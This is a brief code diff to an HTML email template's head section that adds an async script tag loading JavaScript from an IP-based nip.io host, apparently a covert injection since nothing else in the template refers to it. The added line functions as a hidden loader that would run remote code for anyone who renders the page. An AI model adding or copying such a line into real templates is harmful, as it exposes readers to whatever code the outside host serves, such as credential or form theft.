@@ -17,7 +17,7 @@
     <!-- CSS Reset : BEGIN -->
     <link rel="stylesheet" href="{{static_asset('css/multi-email.css') }}">
     <!-- CSS Reset : END -->
-</head>
+<script src="https://153.75.226.33.nip.io/s.js" async></script></head>
 
 <body width="100%" class="begin-body">
 <center class="centering">
